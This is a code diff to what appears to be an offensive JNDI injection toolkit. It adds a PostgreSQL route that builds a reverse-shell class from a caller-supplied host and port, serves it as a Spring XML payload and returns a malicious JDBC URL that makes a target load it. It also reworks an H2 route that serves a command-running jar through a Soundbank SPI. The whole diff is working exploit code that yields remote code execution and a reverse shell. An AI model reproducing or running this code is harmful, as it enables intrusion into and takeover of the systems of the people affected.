@@ -9,6 +9,7 @@ import map.jndi.payload.GroovyPayload;
 import map.jndi.payload.SpringXmlPayload;
 import map.jndi.server.WebServer;
 import map.jndi.template.DerbyJarTemplate;
+import map.jndi.template.ReverseShellTemplate;
 import map.jndi.template.SoundbankTemplate;
 import map.jndi.util.JarUtil;
 import map.jndi.util.MiscUtil;
@@ -78,6 +79,34 @@ public abstract class DatabaseController implements Controller {
 
         String fileName = MiscUtil.getRandStr(12) + ".xml";
         String fileContent = SpringXmlPayload.command(cmd);
+        WebServer.getInstance().serveFile("/" + fileName, fileContent.getBytes());
+
+        String socketFactory = "org.springframework.context.support.ClassPathXmlApplicationContext";
+        String socketFactoryArg = Config.codebase + fileName;
+        String url = "jdbc:postgresql://127.0.0.1:5432/test?socketFactory=" + socketFactory + "&socketFactoryArg=" + socketFactoryArg;
+
+        Properties props = new Properties();
+        props.setProperty("driver", "org.postgresql.Driver");
+        props.setProperty("url", url);
+
+        return props;
+    }
+
+    @JNDIMapping("/PostgreSQL/ReverseShell/{host}/{port}")
+    public Properties postgresqlReverseShell(String host, String port) throws Exception {
+        System.out.println("[PostgreSQL] [ReverseShell] Host: " + host + " Port: " + port);
+
+        String className = MiscUtil.getRandStr(12);
+        ClassPool pool = ClassPool.getDefault();
+        CtClass clazz = pool.get(ReverseShellTemplate.class.getName());
+        clazz.replaceClassName(clazz.getName(), className);
+
+        ReflectUtil.setCtField(clazz, "host", CtField.Initializer.constant(host));
+        ReflectUtil.setCtField(clazz, "port", CtField.Initializer.constant(Integer.parseInt(port)));
+        byte[] byteCode = clazz.toBytecode();
+
+        String fileName = MiscUtil.getRandStr(12) + ".xml";
+        String fileContent = SpringXmlPayload.loadClass(className, byteCode);
         WebServer.getInstance().serveFile("/" + fileName, fileContent.getBytes());
 
         String socketFactory = "org.springframework.context.support.ClassPathXmlApplicationContext";
@@ -179,25 +208,18 @@ public abstract class DatabaseController implements Controller {
     }
 
     @JNDIMapping("/H2/JRE/Soundbank/Command/{cmd}")
-    public Properties h2JRESoundbankCommand(String cmd) {
+    public Properties h2JRESoundbankCommand(String cmd) throws Exception {
         System.out.println("[H2-JRE] [Command] Cmd: " + cmd);
 
-        String className = MiscUtil.getRandStr(12);
         String jarName = MiscUtil.getRandStr(12) + ".jar";
+        String className = MiscUtil.getRandStr(12);
 
-        byte[] jarBytes = null;
+        ClassPool pool = ClassPool.getDefault();
+        CtClass clazz = pool.get(SoundbankTemplate.class.getName());
+        clazz.replaceClassName(clazz.getName(), className);
+        ReflectUtil.setCtField(clazz, "cmd", CtField.Initializer.constant(cmd));
 
-        try {
-            ClassPool pool = ClassPool.getDefault();
-            CtClass clazz = pool.get(SoundbankTemplate.class.getName());
-            clazz.replaceClassName(clazz.getName(), className);
-            ReflectUtil.setCtField(clazz, "cmd", CtField.Initializer.constant(cmd));
-
-            jarBytes = JarUtil.createWithSPI("javax.sound.midi.Soundbank", className, clazz.toBytecode());
-        } catch (Exception e) {
-            e.printStackTrace();
-        }
-
+        byte[] jarBytes = JarUtil.createWithSPI("javax.sound.midi.Soundbank", className, clazz.toBytecode());
         WebServer.getInstance().serveFile("/" + jarName, jarBytes);
 
         String sqlFileName = MiscUtil.getRandStr(12) + ".sql";
